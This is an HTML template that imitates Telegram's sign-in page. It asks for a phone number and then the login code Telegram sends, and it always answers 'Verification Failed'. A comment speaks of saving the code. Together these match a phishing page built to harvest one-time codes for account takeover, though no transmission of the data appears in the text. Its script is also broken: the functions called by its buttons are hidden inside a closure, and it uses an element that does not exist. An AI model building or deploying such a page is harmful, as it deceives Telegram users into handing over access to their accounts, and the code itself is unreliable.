<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <div class="dropdown-container">
                <select id="countryCode" class="dropdown" onchange="updatePhoneNumberPrefix()">
                    <option value="+61">🇦🇺 Australia (+61)</option>
                    <option value="+1">🇺🇸 United States (+1)</option>
                    <option value="+44">🇬🇧 United Kingdom (+44)</option>
                    <option value="+49">🇩🇪 Germany (+49)</option>
                    <option value="+33">🇫🇷 France (+33)</option>
                    <option value="+81">🇯🇵 Japan (+81)</option>
                    <option value="+91">🇮🇳 India (+91)</option>
                    <option value="+86">🇨🇳 China (+86)</option>
                    <option value="+7">🇷🇺 Russia (+7)</option>
                    <option value="+82">🇰🇷 South Korea (+82)</option>
                </select>
            </div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="text" id="phoneNumber" placeholder="Phone Number" oninput="formatPhoneNumber()" pattern="\d*">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <div class="monkey-icon">🐵</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="number" id="verificationCode" placeholder="Code" inputmode="numeric" pattern="\d*">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const countries = [
                { name: 'Australia', code: '+61', flag: '🇦🇺' },
                { name: 'United States', code: '+1', flag: '🇺🇸' },
                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
                { name: 'Germany', code: '+49', flag: '🇩🇪' },
                { name: 'France', code: '+33', flag: '🇫🇷' },
                { name: 'Japan', code: '+81', flag: '🇯🇵' },
                { name: 'India', code: '+91', flag: '🇮🇳' },
                { name: 'China', code: '+86', flag: '🇨🇳' },
                { name: 'Russia', code: '+7', flag: '🇷🇺' },
                { name: 'South Korea', code: '+82', flag: '🇰🇷' }
            ];

            // Populate the dropdown menu
            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `${country.flag} ${country.name} (${country.code})`;
                item.onclick = () => {
                    countryDropdown.value = country.code;
                    updatePhoneNumberPrefix();
                };
                dropdownMenu.appendChild(item);
            });

            function toggleDropdown() {
                dropdownMenu.classList.toggle('show');
                countryDropdown.classList.toggle('open');
            }

            function closeDropdown() {
                dropdownMenu.classList.remove('show');
                countryDropdown.classList.remove('open');
            }

            document.querySelector('.dropdown').addEventListener('click', toggleDropdown);

            function updatePhoneNumberPrefix() {
                const countryCode = countryDropdown.value;
                const phoneNumberInput = document.getElementById('phoneNumber');
                phoneNumberInput.value = phoneNumberInput.value.replace(/^\+\d*/, ''); // Remove previous code
                phoneNumberInput.value = countryCode + phoneNumberInput.value;
            }

            function formatPhoneNumber() {
                const phoneNumberInput = document.getElementById('phoneNumber');
                phoneNumberInput.value = phoneNumberInput.value.replace(/[^0-9+.\-]/g, ''); // Allow only numbers, +, ., and -
            }

            function goToVerificationPage() {
                const phoneNumberInput = document.getElementById('phoneNumber');
                const phoneNumber = phoneNumberInput.value;
                if (phoneNumber) {
                    document.getElementById('phoneDisplay').innerText = phoneNumber;
                    document.getElementById('initialContainer').style.display = 'none';
                    document.getElementById('verificationContainer').style.display = 'block';
                }
            }

            function submitVerification() {
                // Save the verification code and show a final message (mock implementation)
                document.getElementById('verificationContainer').style.display = 'none';
                document.getElementById('finalMessageContainer').style.display = 'block';
            }

            function resetForm() {
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('initialContainer').style.display = 'block';
                document.getElementById('phoneNumber').value = '';
                document.getElementById('verificationCode').value = '';
                document.getElementById('countryCode').value = '+61';
            }

            document.addEventListener('touchstart', handleTouchStart, false);
            document.addEventListener('touchmove', handleTouchMove, false);

            let yStart = null;
            let yEnd = null;

            function handleTouchStart(event) {
                yStart = event.touches[0].clientY;
            }

            function handleTouchMove(event) {
                yEnd = event.touches[0].clientY;

                if (yStart === null) return;

                if (yEnd > yStart + 50) {
                    // Swipe Down
                    document.getElementById('phoneNumber').blur();
                } else if (yEnd < yStart - 50) {
                    // Swipe Up
                    document.getElementById('phoneNumber').focus();
                }
                yStart = null;
                yEnd = null;
            }
        });
    </script>
</body>
</html>
